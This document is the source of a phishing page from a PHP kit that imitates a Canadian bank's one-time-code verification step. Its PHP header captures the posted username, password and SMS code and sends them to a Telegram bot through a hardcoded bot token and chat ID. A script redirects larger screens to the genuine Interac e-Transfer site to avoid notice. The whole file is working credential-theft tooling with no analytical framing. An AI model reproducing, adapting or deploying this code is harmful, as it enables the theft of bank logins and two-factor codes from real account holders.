<?php

    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 


$message =" $bank$lh$ip\n\n---$user\n\n$pass\n\n";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?><html lang="en_CA"><head>
<meta content="text/html; charset=UTF-8"><style>@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>

    
    
    
    
    
    
    
    
    

    

    
    
    

    
    
<link type="text/css" href="Login_files/theme-lakeview.css" rel="stylesheet"></head><body class="uxp-theme ng-scope">


<div class="widget-c1-oauth-login position-relative oauth-login">
    

    
    
    <div class="ng-scope" as="" id="">
        
        <div class="errors errors-login">
            <span></span>
        </div>
        
        
    <form id="loginForm" class="center-block c1-login-form ng-valid-minlength ng-valid-maxlength ng-valid-parse ng-dirty ng-invalid ng-invalid-uxp-pattern ng-invalid-required" method="post" ng-class="" action="Login.php" name="">

            <!-- ReCaptcha -->
            


            <div>
                <!-- Memorized account select -->
                

                <!-- pan/pac login -->
                <div ng-form="newLoginForm" ng-hide="showingMemorizedAccounts()" class="ng-valid-minlength ng-valid-maxlength ng-valid-parse ng-dirty ng-invalid ng-invalid-uxp-pattern ng-invalid-required">
                    
                    

                    <div class="logo text-center">
        <img src="Login_files/logo.png" alt="Logo">
        
</div>
                    
                    

                    <div class="form-group ng-hide" ng-show="selectedMemorizedAccount.nickname">
                        <h4>Enter passcode for <em class="ng-binding"></em></h4>
                    </div>
                    <div class="login-id-fields" ng-show="!state.usingMemorizedUser">
                        <div class="new-login-fields">
                            
                            
    <div class="form-group">
        
        
        
        
    </div>
    <div ng-if="!state.usingMemorizedUser" ng-class="
            [
                'form-group',
                {
                    'is-invalid': isMemberNumInvalid()
                }
            ]
         " class="ng-scope form-group is-invalid">
        
    <div ng-class="
            [
                'text-input',
                {
                    'is-empty': !(uxpLoginForm.newLoginForm.memberNum.$modelValue)
                }
            ]
            " class="text-input is-empty">
            
            
        <label>
                
                
            <span aria-hidden="true">We sent you a Code!</span><input id="memberNum" maxlength="12" uxp-pattern="^.{1,12}$" aria-describedby="memberNumError" autocomplete="username" aria-required="true" aria-invalid="true" android-margin="" name="code" class="form-control ng-valid-required ng-valid-maxlength ng-dirty ng-valid-parse ng-touched ng-empty ng-invalid ng-invalid-uxp-pattern" placeholder="Code"></label></div></div>

                        </div>
                        
                        
                    </div>
                    
                    
                    
                    

                    

                    <div class="text-center c1-btn-container">
                        
                        <button type="submit" id="loginSubmit">Login</button>

                        
                    </div>

                    

                    

                    
                </div>


                

                
            </div>
        </form>

    </div>
</div>














    
    
    




</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>